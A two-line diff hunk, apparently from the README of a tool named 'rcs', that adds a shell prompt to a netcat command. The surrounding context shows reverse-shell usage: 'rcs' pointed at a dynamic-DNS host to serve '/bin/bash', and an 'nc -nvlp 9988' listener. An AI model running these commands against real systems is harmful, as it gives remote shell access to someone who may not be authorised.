@@ -12,4 +12,4 @@ $ ./rcs sample.noip.com 9988 '/bin/bash' 10 5 2>/dev/null
  
 Remote (netcat) usage: nc -nvlp <PORT>
   
-nc -nvlp 9988
+$ nc -nvlp 9988
